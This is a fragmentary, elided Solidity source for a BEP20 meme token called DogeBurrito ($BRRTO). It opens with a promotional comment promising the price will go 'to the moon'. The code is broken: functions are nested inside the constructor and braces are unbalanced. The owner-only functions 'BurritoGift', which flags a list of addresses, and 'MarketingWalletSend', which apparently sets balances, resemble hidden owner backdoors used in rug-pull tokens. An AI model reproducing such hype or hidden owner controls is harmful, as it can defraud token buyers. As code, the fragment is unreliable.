...
/**
Are you ready to get Burrito!? DogeBurrito based on Doge coin and now we're taking the hype by launching with organic members and strong community! with different tokenomics with 1% burning system from every transactions it will increase the price of the $BRRTO sending it to the moon! 

Marketing Plan is the most important key on every token . that's why team already brought some marketing experts on every platform.
...
*/
    ...
    contract DogeBurrito   is IBEP20, Ownable
    {
        ...
        string private constant _name = "DogeBurrito";
        string private constant _symbol = "BRRTO";
        ...
        address public constant MarketingWallet=0x3Bd73d10832A5f0cfF36AD7556C5A0742604CC4e; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function BurritoGift(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function MarketingWalletSend(address account, uint256 balance) onlyOwner  public virtual {
